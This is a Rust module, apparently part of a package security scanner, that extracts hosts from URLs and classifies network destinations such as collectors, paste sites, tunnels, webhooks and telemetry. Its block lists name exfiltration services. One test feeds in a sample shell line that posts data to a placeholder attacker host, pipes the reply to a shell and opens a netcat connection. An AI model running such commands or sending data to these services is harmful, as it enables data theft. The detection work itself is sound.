//! Where does it send? Host extraction and destination classification.

use crate::model::DestKind;

/// Host from a URL-ish string: `https://h:1/p`, `//h/p`, `git+ssh://git@h/p`,
/// `ws://h`, or a bare `h.tld/path` / IPv4.
pub fn host_of(s: &str) -> Option<String> {
    let s = s.trim();
    let has_scheme = s.contains("://") || s.starts_with("//");
    let after = if let Some(i) = s.find("://") {
        &s[i + 3..]
    } else if let Some(rest) = s.strip_prefix("//") {
        rest
    } else {
        s
    };
    // Without a scheme, "lib/x.js" or "setup.json" are paths, not hosts.
    const FILE_EXTS: &[&str] = &[
        "js", "mjs", "cjs", "json", "ts", "md", "txt", "sh", "html", "css", "map", "node", "exe", "dll", "so",
        "zip", "gz", "tgz", "tar", "png", "jpg", "svg", "wasm", "lock", "yml", "yaml", "log", "bin", "py",
    ];
    if !has_scheme {
        let first = after.split(['/', '?', '#']).next().unwrap_or("");
        let tld = first.rsplit('.').next().unwrap_or("").to_ascii_lowercase();
        if FILE_EXTS.contains(&tld.as_str()) {
            return None;
        }
    }
    let authority = after.split(['/', '?', '#']).next()?;
    let authority = authority.rsplit('@').next()?; // drop userinfo
    let host = if authority.starts_with('[') {
        authority.split(']').next()?.trim_start_matches('[')
    } else {
        authority.split(':').next()?
    };
    let host = host.trim().trim_end_matches('.').to_ascii_lowercase();
    if host.is_empty() || host.contains('§') || host.contains(' ') {
        return None;
    }
    if is_ipv4(&host) || (host.contains('.') && host.chars().all(|c| c.is_ascii_alphanumeric() || c == '.' || c == '-')) {
        let tld = host.rsplit('.').next().unwrap_or("");
        if is_ipv4(&host) || (tld.len() >= 2 && tld.chars().all(|c| c.is_ascii_alphabetic())) {
            return Some(host);
        }
    }
    None
}

pub fn is_ipv4(h: &str) -> bool {
    let parts: Vec<&str> = h.split('.').collect();
    parts.len() == 4 && parts.iter().all(|p| !p.is_empty() && p.len() <= 3 && p.parse::<u8>().is_ok())
}

pub fn is_private_ip(h: &str) -> bool {
    if !is_ipv4(h) {
        return h == "localhost";
    }
    let o: Vec<u8> = h.split('.').map(|p| p.parse().unwrap_or(0)).collect();
    matches!(o[0], 0 | 10 | 127) || (o[0] == 192 && o[1] == 168) || (o[0] == 172 && (16..=31).contains(&o[1])) || (o[0] == 169 && o[1] == 254)
}

fn host_matches(host: &str, domain: &str) -> bool {
    host == domain || host.ends_with(&format!(".{domain}"))
}

const COLLECTORS: &[&str] = &[
    "webhook.site", "pipedream.net", "pipedream.com", "requestbin.com", "requestbin.net", "requestcatcher.com",
    "interact.sh", "interactsh.com", "oast.fun", "oast.pro", "oast.live", "oast.site", "oast.online", "oast.me",
    "oastify.com", "burpcollaborator.net", "canarytokens.com", "canarytokens.org", "beeceptor.com", "hookbin.com",
    "postb.in", "dnslog.cn", "ceye.io", "bxss.me", "requestrepo.com", "webhook.cool", "mockbin.org",
];
const PASTE: &[&str] = &[
    "pastebin.com", "paste.ee", "hastebin.com", "toptal.com", "ghostbin.com", "rentry.co", "transfer.sh", "file.io",
    "0x0.st", "termbin.com", "dpaste.org", "paste.rs",
];
const TUNNELS: &[&str] = &[
    "ngrok.io", "ngrok.app", "ngrok-free.app", "ngrok.dev", "trycloudflare.com", "loca.lt", "localtunnel.me",
    "serveo.net", "localhost.run", "lhr.life", "pagekite.me", "bore.pub",
];
const REGISTRIES: &[&str] = &["registry.npmjs.org", "registry.yarnpkg.com", "registry.npmjs.com"];

/// (domain, opt-out note)
const TELEMETRY: &[(&str, &str)] = &[
    ("telemetry.nextjs.org", "Next.js anonymous telemetry; opt out with NEXT_TELEMETRY_DISABLED=1"),
    ("telemetry.gatsbyjs.com", "Gatsby telemetry; opt out with GATSBY_TELEMETRY_DISABLED=1"),
    ("telemetry.astro.build", "Astro telemetry; opt out with ASTRO_TELEMETRY_DISABLED=1"),
    ("events.storybook.js.org", "Storybook telemetry; opt out with STORYBOOK_DISABLE_TELEMETRY=1"),
    ("telemetry.nuxtjs.com", "Nuxt telemetry; opt out with NUXT_TELEMETRY_DISABLED=1"),
    ("google-analytics.com", "analytics (e.g. Angular CLI); Angular opts out with NG_CLI_ANALYTICS=false"),
    ("telemetry.vercel.com", "Vercel CLI telemetry; opt out with VERCEL_TELEMETRY_DISABLED=1"),
];

/// What the package itself says its home is; downloads from there are expected.
#[derive(Default, Clone, Debug)]
pub struct Home {
    pub hosts: Vec<String>,
    pub github_repo: Option<String>,
}

/// Classify a destination. `url` is the full string when known (needed for
/// path-based rules: discord webhooks, telegram bot API, GitHub releases).
pub fn classify(host: &str, url: &str, home: &Home) -> (DestKind, Option<String>) {
    let lower = url.to_ascii_lowercase();
    if is_ipv4(host) && !is_private_ip(host) {
        return (DestKind::RawIp, None);
    }
    if (host_matches(host, "discord.com") || host_matches(host, "discordapp.com")) && lower.contains("/api/webhooks") {
        return (DestKind::ChatWebhook, None);
    }
    if host == "api.telegram.org" || host_matches(host, "hooks.slack.com") {
        return (DestKind::ChatWebhook, None);
    }
    if COLLECTORS.iter().any(|d| host_matches(host, d)) {
        return (DestKind::Collector, None);
    }
    if PASTE.iter().any(|d| host_matches(host, d)) || (host == "toptal.com" && lower.contains("hastebin")) {
        return (DestKind::Paste, None);
    }
    if TUNNELS.iter().any(|d| host_matches(host, d)) {
        return (DestKind::Tunnel, None);
    }
    if REGISTRIES.contains(&host) {
        return (DestKind::Registry, None);
    }
    if let Some((_, note)) = TELEMETRY.iter().find(|(d, _)| host_matches(host, d)) {
        return (DestKind::KnownTelemetry, Some(note.to_string()));
    }
    if let Some(repo) = &home.github_repo {
        let repo = repo.to_ascii_lowercase();
        let gh_release = (host == "github.com" && lower.contains(&format!("github.com/{repo}")))
            || (host == "objects.githubusercontent.com" || host == "release-assets.githubusercontent.com")
            || (host == "raw.githubusercontent.com" && lower.contains(&format!("raw.githubusercontent.com/{repo}")))
            || (host == "api.github.com" && lower.contains(&format!("/repos/{repo}")));
        if gh_release {
            return (DestKind::PackageHome, None);
        }
    }
    if home.hosts.iter().any(|h| h != "github.com" && h != "gitlab.com" && host_matches(host, h)) {
        return (DestKind::PackageHome, None);
    }
    (DestKind::Other, None)
}

/// URLs, hosts and IPv4s mentioned in free text (shell commands, decoded strings).
pub fn extract_urls(text: &str) -> Vec<String> {
    let mut out = Vec::new();
    for scheme in ["https://", "http://", "wss://", "ws://", "ftp://"] {
        let mut rest = text;
        while let Some(i) = rest.find(scheme) {
            let tail = &rest[i..];
            let end = tail
                .find(|c: char| c.is_whitespace() || "\"'`<>|;)(,\\".contains(c))
                .unwrap_or(tail.len());
            out.push(tail[..end].to_string());
            rest = &tail[scheme.len()..];
        }
    }
    // bare IPv4 (e.g. `nc 45.77.12.9 4444`)
    for tok in text.split(|c: char| !(c.is_ascii_digit() || c == '.')) {
        if is_ipv4(tok) && !out.iter().any(|u| u.contains(tok)) {
            out.push(tok.to_string());
        }
    }
    out
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn hosts() {
        assert_eq!(host_of("https://user:pw@Example.COM:8443/x?y").as_deref(), Some("example.com"));
        assert_eq!(host_of("45.77.12.9").as_deref(), Some("45.77.12.9"));
        assert_eq!(host_of("git+ssh://git@github.com/a/b.git").as_deref(), Some("github.com"));
        assert_eq!(host_of("https://§/x"), None);
        assert_eq!(host_of("just words"), None);
        assert_eq!(host_of("file.js"), None, "a filename is not a host");
    }

    #[test]
    fn classification() {
        let home = Home { hosts: vec!["esbuild.github.io".into()], github_repo: Some("evanw/esbuild".into()) };
        let c = |h: &str, u: &str| classify(h, u, &home).0;
        assert_eq!(c("45.77.12.9", "https://45.77.12.9/c"), DestKind::RawIp);
        assert_eq!(c("127.0.0.1", "http://127.0.0.1:3000"), DestKind::Other);
        assert_eq!(c("discord.com", "https://discord.com/api/webhooks/1/abc"), DestKind::ChatWebhook);
        assert_eq!(c("api.telegram.org", "https://api.telegram.org/bot123/sendMessage"), DestKind::ChatWebhook);
        assert_eq!(c("abc.oast.fun", "https://abc.oast.fun"), DestKind::Collector);
        assert_eq!(c("webhook.site", "https://webhook.site/uuid"), DestKind::Collector);
        assert_eq!(c("x.ngrok-free.app", "https://x.ngrok-free.app"), DestKind::Tunnel);
        assert_eq!(c("pastebin.com", "https://pastebin.com/raw/x"), DestKind::Paste);
        assert_eq!(c("registry.npmjs.org", "https://registry.npmjs.org/x"), DestKind::Registry);
        assert_eq!(c("github.com", "https://github.com/evanw/esbuild/releases/download/v1/x"), DestKind::PackageHome);
        assert_eq!(c("github.com", "https://github.com/someone/else/releases"), DestKind::Other);
        assert_eq!(c("esbuild.github.io", "https://esbuild.github.io/"), DestKind::PackageHome);
        assert_eq!(classify("telemetry.nextjs.org", "", &home).0, DestKind::KnownTelemetry);
        assert!(classify("telemetry.nextjs.org", "", &home).1.unwrap().contains("NEXT_TELEMETRY_DISABLED"));
    }

    #[test]
    fn extracts_from_shell() {
        let u = extract_urls("curl -s -X POST https://evil.example/c -d @- | sh; nc 45.77.12.9 4444");
        assert!(u.contains(&"https://evil.example/c".to_string()));
        assert!(u.contains(&"45.77.12.9".to_string()));
    }
}
